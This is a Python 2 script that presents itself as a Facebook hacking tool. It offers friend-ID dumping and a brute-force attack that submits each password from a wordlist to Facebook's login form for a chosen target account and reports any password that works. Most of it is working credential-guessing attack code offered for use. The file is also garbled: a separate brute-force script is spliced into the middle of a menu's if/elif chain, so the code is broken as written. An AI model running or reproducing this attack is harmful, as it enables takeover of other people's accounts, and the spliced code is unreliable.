#!usr/bin/python2.7
# coding=utf-8
#The Credit For This Code Goes To Rana Aahil
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020

import os, time
from app import config
from app import login
from app import crack
from src import friends_list
from src import friends
from src import search_name
from src import likes
from bs4 import BeautifulSoup as parser
import time
import sys
import random
import cookielib
import mechanize

wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan

def runntxt(s):
        for noobs in s + '\n':
                sys.stdout.write(noobs)
                sys.stdout.flush()
                time.sleep(10. / 2100)


def jalan(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.02)

class Brute(object):
	def __init__(self, url):
		self.url = url
		self.config = config.Config()
		self.cookie = self.config.loadCookie()
		self.menu = '\n'
		self.menu += ('  [ \033[0;96m01\033[0m ]  \033[1;91mStart Crack\n')
		self.menu += ('  [ \033[0;96m02\033[0m ]  \033[1;91mDump Id Friends\n')
		self.menu += ('  [ \033[0;96m03\033[0m ]  \033[1;91mDump Id by Search name\n')
		self.menu += ('  [ \033[0;96m04\033[0m ]  \033[1;91mDump Id from likes status\n')
                self.menu += ('  [ \033[1;96m05\033[0m ]  \033[0mDump id Friends lists\n')
		self.menu += ('  [ \033[0;96m06\033[0m ]  \033[0mBrute Force Attack\n')
                self.menu += ('  [ \033[1;96m07\033[0m ]  \033[0mUpdate Script?\n')
		self.menu += ('  [ \033[0;96m00\033[0m ]  \033[0mRemove cookies\n')
		if self.cookie == False:
			login.loginFb(self, self.url, self.config)
			self.cookie = self.config.loadCookie()

	def start(self):
		response = self.config.httpRequest(self.url+'/profile.php', self.cookie).encode('utf-8')
		if 'mbasic_logout_button' in str(response):
			self.main(response)
		else:
			os.remove('log/cookies.log')
			print('\n\033[0;91m[WARNING] Cookies invalids, please login again.\033[0m')
			raw_input('\n[ Press Enter]')
			login.loginFb(self, self.url, self.config)
			self.cookie = self.config.loadCookie()
			self.start()
			exit()

	def main(self, response):
		os.system('clear')
		print(self.config.banner())
		html = parser(response, 'html.parser')
		jalan('\033[1;91m_________________________________________________________')
		jalan('\t\t\n\033[1;94m      (\033[0;96m•\033[1;94m) BY: ZERO-ZxXxAngel-ZalasXa \033[0;96m•')
		jalan('\033[1;91m_________________________________________________________')
		print(self.menu)
		try:
			choose = int(raw_input('\033[1;94m Selaa>===>># '))
		except ValueError:
			exit('\n\033[0;91mYou Crazy.\033[0m')
		if choose == 1:
			exit(crack.Brute().main())
		elif choose == 2:
			exit(friends.main(self, self.cookie, self.url, self.config))
		elif choose == 3:
			exit(search_name.main(self, self.cookie, self.url, self.config))
		elif choose == 4:
			exit(likes.main(self, self.cookie, self.url, self.config))
                elif choose == 5:
                        exit(friends_list.main(self, self.cookie, self.url, self.config))
		elif choose == 6:

def banner():
    os.system('clear')
    print " "
    runntxt(RR+"              ____________     ___  ______________")
    runntxt(RR+"              |  ___| ___ \    |  \/  |  _  |  _  |")
    runntxt(RR+"              | |_  | |_/ /_  _| .  . | | | | | | |")
    runntxt(WW+"              |  _| | ___ \ \/ / |\/| | | | | | | |")
    runntxt(WW+"              | |   | |_/ />  <| |  | \ \_/ / |/ /")
    runntxt(WW+"              \_|   \____//_/\_\_|  |_/\___/|___/")
    runntxt(WW+" ")
    runntxt(RR+"              FACEBOOK HACK SCR\033[0mIPT FROM INDONESIA")
    runntxt(RR+" ")

banner()

print " "
print RR+"ENTER TARGET ID/USERNAME "
email_target = str(raw_input(WW+"(Shelaa)==>\033[1;92m  "))
print " "
print RR+"ENTER THE WORDLIST FILE NAME"
password_list = str(raw_input(WW+"(Shelaa)==>\033[1;92m "))
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',)]

def pil():
                print GG+" "
                g = str(raw_input("[?] Restart?..\033[93;1m[y/n]: "))
                if g == 'y' or g == 'Y':
                    os.system('python2 FBxMOD.VNM')
                elif g == 'n' or g == 'N':
                    print wd+"exit the program..."
                    sys.exit()
                else:
                    print RR+"choose correctly..."
                    pil()

def edit_wordlist():

        print GG+" "
        ed = str(raw_input("[?] Edit wordlist .? \033[96;1m[y/n]: "))
        if ed == 'y' or ed == 'Y':
                os.system('nano '+password_list)
                pil()
        elif ed == 'n' or ed == 'N':
                print wd+"exit the program..."
                sys.exit()

        else:
                print RR+"choose correctly..."
                edit_wordlist()

def main():
        global noobs
        noobs = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        noobs.set_handle_robots(False)
        noobs.set_handle_redirect(True)
        noobs.set_cookiejar(cj)
        noobs.set_handle_equiv(True)
        noobs.set_handle_referer(True)
        noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        runn_noobs()
        life()
        print " "
        print RR+" Wordlist Not Found..."
        print " "
	

def iqbalz(iqbalz_password):
  try:
 	sys.stdout.write(RR+"\n[\033[0m+\033[91m]\033[91;1m [\033[0m"+email_target+"\033[91m]\033[1;91m Mencoba \033[0m==> \033[91m[\033[90;1m"+iqbalz_password)
	sys.stdout.flush()
	noobs.addheaders = [('User-agent', random.choice(useragents))]
	site = noobs.open(login)
	noobs.select_form(nr = 0)
	noobs.form['email'] = email_target
	noobs.form['pass'] = iqbalz_password
	tom = noobs.submit()
	mask = tom.geturl()
	if mask != login and (not 'login_attempt' in mask):
                        print " "
			print ("\033[96m  S U C C E S S")
			print "          P A S S W O R D "
                  	print RR+"+-----------------------+"
	         	print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
        	        print (WW+"#\033[97m Password Target:\033[92m {}").format(iqbalz_password)
        	        print " "
        	        raw_input(GG+"[ENTER]..")
			sys.exit(1)
  
  
  except KeyboardInterrupt:
      print wd+"Stop......."
      edit_wordlist()
      sys.exit()    	    
def life():
	global iqbalz_password
	password_nob = open(password_list, "r")
	for iqbalz_password in password_nob:
		password_nob = iqbalz_password.replace("\n","")
		iqbalz(iqbalz_password)		

def runn_noobs():
         global password_list

         lop = RR+"""
              FACEBOOK HACK SCR\033[0mIPT FROM INDONESIA
   """



         print lop
         nuub = open(password_list, 'r')
         nuub = nuub.readlines()
         print RR+" [#] ID / Username Target\033[92;1m: {}".format(email_target)
         print RR+" [#] Current password number\033[92;1m:", len(nuub),'password'
         print WW+" [#] Please wait..."
         print WW+" [#] Stop Proses (CTRL+Z"
         print " "

if __name__=='__main__':
	main()	

                elif choose == 7:
                        os.system('clear')
                        jalan('\033[1;94mPlease Wait !')
		        os.system('git pull origin master')
		        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		        exit()
		elif choose == 0:
			ask = raw_input('\nAre you Sure? [y/N]:\033[1;91m ')
			if ask.lower() == 'y':
				jalan('\nRemoving cookies...')
				time.sleep(2)
				os.remove('log/cookies.log')
				jalan('\n\033[1;92mSuccess removed!\033[0m')
				time.sleep(2)
				login.loginFb(self, self.url, self.config)
				self.cookie = self.config.loadCookie()
				self.start()
			else:
				self.cookie = self.config.loadCookie()
				print('\ncanceled!')
				self.start()
		else: exit('\n\033[0;91mYou crazy.\033[0m')
